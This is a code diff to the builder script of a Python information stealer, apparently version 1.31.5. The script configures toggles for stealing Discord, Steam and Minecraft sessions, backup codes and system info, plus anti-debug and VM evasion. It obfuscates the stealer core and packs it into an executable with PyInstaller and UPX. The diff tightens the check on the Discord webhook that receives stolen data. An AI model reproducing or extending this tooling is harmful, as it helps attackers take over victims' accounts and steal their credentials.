@@ -24,7 +24,7 @@ from utils.module.Obfuscators import Obfuscators # Restored because obfscator wa
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=5)
 
-version = "v1.31.4"
+version = "v1.31.5"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam"]
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal"]
 PATH = "src/stealer_core/src.py"
@@ -68,12 +68,13 @@ def ask_toggle(key):
 
 
 def ask_webhook():
+    webhook_pattern = re.compile(r"^https://(canary\.|ptb\.)?(discord\.com|discordapp\.com)/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,}")
     while True:
         val = input(f"{Fore.LIGHTMAGENTA_EX}?{Fore.RESET} Enter Your Webhook:{Fore.CYAN} ").strip()
-        if val.startswith("http://") or val.startswith("https://"):
+        if webhook_pattern.match(val):
             return val
         else:
-            log_debug(f"Invalid Webhook URL provided.")
+            log_debug("Invalid Webhook URL provided.")
 
 def update_config_in_file(filepath, updated_config, webhook_url=None):
     try:
@@ -113,8 +114,6 @@ def build():
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
     os.system('pyinstaller --onefile --clean --name="vault" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
-    input("Press Enter key to exit.")
-    sys.exit(0)
 
 def main():
     config = {}
